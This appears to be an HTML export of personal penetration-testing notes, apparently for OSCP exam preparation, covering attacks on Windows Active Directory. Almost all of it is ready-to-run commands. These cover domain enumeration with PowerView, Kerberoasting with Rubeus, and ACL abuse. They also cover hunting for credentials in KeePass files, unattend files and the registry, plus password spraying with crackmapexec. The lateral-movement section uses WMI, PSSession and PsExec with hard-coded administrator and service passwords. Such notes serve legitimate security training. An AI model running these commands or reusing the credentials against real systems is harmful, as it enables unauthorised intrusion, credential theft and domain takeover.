<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01-Recon</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01-Recon</h1><br/><p></p><p><strong><h2>RECON</h2></strong></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># find domain users</span><br />net user /domain<br /><span style="color:#0088ff;font-weight:400"># find  user beloging in domain+ info like description</span><br />net user <span style="color:#7f0044;font-weight:400">$user</span> /domain<br /><span style="color:#0088ff;font-weight:400"># check history of domain users </span><br />Get-History<br /><span style="color:#333333;font-weight:400">(Get-PSReadlineOption).HistorySavePath<br /><br /><br />## kerberoast /asrepoast <br />* .\Rubeus.exe <br /><br /># Powerview:<br />## find users in the domain <br />get-netuser |select samaccountname,Description,serviceprincipalname<br />get-netgroup |select cn <br />get-netgroup $group |select member<br /><br /># #browse users paths<br />cd \User\<br />tree /A /F<br />gci -File -Recurse<br /><br />## find domain name <br />$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br /><br />## enum logged in users<br />Get-NetLoggedon -Computername &lt;clientxxx&gt; <br /><br />## enum all active sessions<br />o -ComputerName &lt;dc&gt;<br /><br />## enum all computers<br />Get-NetComputer | select operatingsystem,dnshostname<br />##find local domain access : connect to every AD machine and check if u have local admin access <br />Find-LocalAdminAccess<br />## find user sessions via psloggedon (remote registry): new method Only works on servers and windows client &lt;=8 + potential other factors <br />.\Psloggedon.exe \\$computername<br /><br />## SPN enum<br />Get-NetUser -SPN | select samaccountname,serviceprincipalname<br /><br />## domain shares <br />Find-DomainShare<br />ls \\dc01.oscp.exam\sysvol\oscp.exam\Policies\ ## gpp passwords in old policies  <br /><br /><br />## ENUMERATE ACLS <br />### generic all: full permission on objetcs<br />### GenericWrite edit certain attributes on the object<br />## writeowner : change ownership of the object <br />## writedacl : edit ace&#39;s applied to object <br />### allextendedrights: change password , reset password <br />### forcechangepassword: password change for objecrt<br />### SELF (self membership): add ourselves to for example a group<br /><br /><br />### Manual way<br />Get-ObjectAcl -Identity $user| Select ActiveDirectoryRights, SecurityIdentifier<br />Convert-SidToName $security_id<br /><br /><br />### automated objectdn has active rights on <br />Find-InterestingDomainAcl |Select ObjectDN,ActiveDirectoryRights,IdentityReferenceName,IdentityReferenceClass<br /><br />## find interesting files<br />gci -Force -Recurse -File -Include *.kdbx  -ErrorAction SilentlyContinue <br /><br /><br />Get-NetLoggedon -ComputerName ms02<br /><br /><br />Get-Childitem â€“Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)}<br /><br /><br />REG QUERY HKLM /F &quot;password&quot; /t REG_SZ /S /K<br />REG QUERY HKCU /F &quot;password&quot; /t REG_SZ /S /K<br />REG QUERY HKLM /F &quot;password&quot; /t REG_SZ /S /d</span><br /><span style="color:#333333;font-weight:400">REG QUERY HKCU /F &quot;password&quot; /t REG_SZ /S /d</span><br /></pre></div></p><p></p><p><strong><h2>Internal enumeration</h2></strong></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">for</span> <span style="color:#ff9d00;font-weight:700">/</span>L <span style="color:#ff9d00;font-weight:700">%</span>i <span style="color:#ff9d00;font-weight:700">in</span> (<span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">255</span>) <span style="color:#ff9d00;font-weight:700">do</span> @ping <span style="color:#ff9d00;font-weight:700">-</span>n <span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">-</span>w <span style="color:#333333;font-weight:400">200</span> <span style="color:#333333;font-weight:400">10.5</span>.<span style="color:#333333;font-weight:400">5</span>.<span style="color:#ff9d00;font-weight:700">%</span>i &gt; nul &amp;&amp; <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#333333;font-weight:400">10.5</span>.<span style="color:#333333;font-weight:400">5</span>.<span style="color:#ff9d00;font-weight:700">%</span>i is up.<br /><br />proxychains nmap <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">top-ports</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1000</span> <span style="color:#ff9d00;font-weight:700">-</span>sT <span style="color:#ff9d00;font-weight:700">-</span>Pn <span style="color:#ff9d00;font-weight:700">-</span>iL ips.txt <span style="color:#ff9d00;font-weight:700">--</span>open<br /><br /><span style="color:#0088ff;font-weight:400">### password spraying </span><br />proxychains4 <span style="color:#ff9d00;font-weight:700">-</span>q crackmapexec smb ms01 <span style="color:#ff9d00;font-weight:700">-</span>u users.txt <span style="color:#ff9d00;font-weight:700">-</span>p hghgib6vHT3bVWf <span style="color:#ff9d00;font-weight:700">--continue</span><span style="color:#00117f;font-weight:400">-on-success</span></pre></div></p><p></p><p><h2>Lateral movement</h2></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># technique  1</span><br /><span style="color:#7f0044;font-weight:400">$password</span> = ConvertTo-SecureString <span style="color:#3ad900;font-weight:400">&quot;administrator&quot;</span> -AsPlainText -Force<br /><span style="color:#7f0044;font-weight:400">$cred</span> = New-Object System.Management.Automation.PSCredential<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;913mtbbJa*Q25iDg&quot;</span>, <span style="color:#7f0044;font-weight:400">$password</span><span style="color:#ff9d00;font-weight:700">)</span><br /><span style="color:#7f0044;font-weight:400">$session1</span>=New-PSSession -ComputerName 172.16.131.100 -Credential <span style="color:#7f0044;font-weight:400">$cred</span><br /><span style="color:#ff9d00;font-weight:700">whoami</span><br /><span style="color:#7f0044;font-weight:400">$password</span> = ConvertTo-SecureString <span style="color:#3ad900;font-weight:400">&quot;Service1&quot;</span> -AsPlainText -Force<br /><span style="color:#7f0044;font-weight:400">$cred</span> = New-Object System.Management.Automation.PSCredential<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;iis_svc&quot;</span>, <span style="color:#7f0044;font-weight:400">$password</span><span style="color:#ff9d00;font-weight:700">)</span><br /><span style="color:#7f0044;font-weight:400">$session1</span>=New-PSSession -ComputerName 172.16.131.100 -Credential <span style="color:#7f0044;font-weight:400">$cred</span><br /><span style="color:#ff9d00;font-weight:700">whoami</span><br /><br /><span style="color:#0088ff;font-weight:400">## technique 2 winrm</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## technique 3 wmi</span><br /><br /><span style="color:#7f0044;font-weight:400">$username</span> = <span style="color:#3ad900;font-weight:400">&#39;OSCP\administrator&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#7f0044;font-weight:400">$password</span> = <span style="color:#3ad900;font-weight:400">&#39;913mtbbJa*Q25iDg&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#7f0044;font-weight:400">$secureString</span> = ConvertTo-SecureString <span style="color:#7f0044;font-weight:400">$password</span> -AsPlaintext -Force<span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#7f0044;font-weight:400">$credential</span> = New-Object System.Management.Automation.PSCredential <span style="color:#7f0044;font-weight:400">$username</span>, <span style="color:#7f0044;font-weight:400">$secureString</span><span style="color:#ff9d00;font-weight:700">;</span><br /><br /><span style="color:#7f0044;font-weight:400">$options</span> = New-CimSessionOption -Protocol DCOM<br /><span style="color:#7f0044;font-weight:400">$session</span> = New-Cimsession -ComputerName dc -Credential <span style="color:#7f0044;font-weight:400">$credential</span> -SessionOption <span style="color:#7f0044;font-weight:400">$Options</span> <br /><span style="color:#7f0044;font-weight:400">$command</span> = <span style="color:#3ad900;font-weight:400">&#39;whoami&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><br />Invoke-CimMethod -CimSession <span style="color:#7f0044;font-weight:400">$Session</span> -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =<span style="color:#7f0044;font-weight:400">$Command</span>}<span style="color:#ff9d00;font-weight:700">;</span><br /><br /><span style="color:#0088ff;font-weight:400">## cmdline </span><br />wmic /node:dc /user:administrator /password:<span style="color:#3ad900;font-weight:400">&#39;913mtbbJa*Q25iDg&#39;</span> process call create <span style="color:#3ad900;font-weight:400">&quot;whoami&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## psexec</span><br />.<span style="color:#ff9d00;font-weight:700">/</span>PsExec64.exe -i  <span style="color:#333333;font-weight:400">\\</span>dc -u oscp.exam<span style="color:#333333;font-weight:400">\a</span>dministrator -p <span style="color:#3ad900;font-weight:400">&#39;913mtbbJa*Q25iDg&#39;</span> cmd<br /><br />Invoke-WmiMethod win32_process -ComputerName ms02.oscp.exam-name create -argumentlist <span style="color:#3ad900;font-weight:400">&quot;powershell.exe whoami&quot;</span></pre></div></p></div>
</body>
</html>
